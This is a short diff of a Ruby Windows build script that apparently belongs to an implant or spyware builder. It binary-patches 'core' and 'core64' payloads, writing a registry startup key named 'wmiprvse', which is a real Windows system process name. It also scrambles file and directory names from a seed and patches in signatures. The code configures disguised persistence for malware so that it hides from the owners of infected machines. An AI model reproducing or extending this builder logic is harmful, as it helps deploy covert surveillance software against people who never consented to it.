@@ -62,7 +62,7 @@ class BuildWindows < Build
     patch_file(:file => 'core') do |content|
       begin
         # the new registry key
-        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', 'wmiprvse'.ljust(38, "\x00")
+        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key.ljust(38, "\x00")
         # and the old one (previous method)
         core = scramble_name(@factory.seed, 3)
         dir = scramble_name(core[0..7], 7)
@@ -96,6 +96,16 @@ class BuildWindows < Build
         content.binary_patch marker, signature
       rescue
         raise "Signature marker not found"
+      end
+    end
+
+    # patching for the registry key name
+    patch_file(:file => 'core64') do |content|
+      begin
+        # the new registry key
+        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key.ljust(38, "\x00")
+      rescue
+        raise "Registry key marker not found"
       end
     end
 
@@ -290,6 +300,10 @@ class BuildWindows < Build
     end
 
     do_signature
+  end
+
+  def reg_start_key
+    return 'wmiprvse'
   end
 
 end
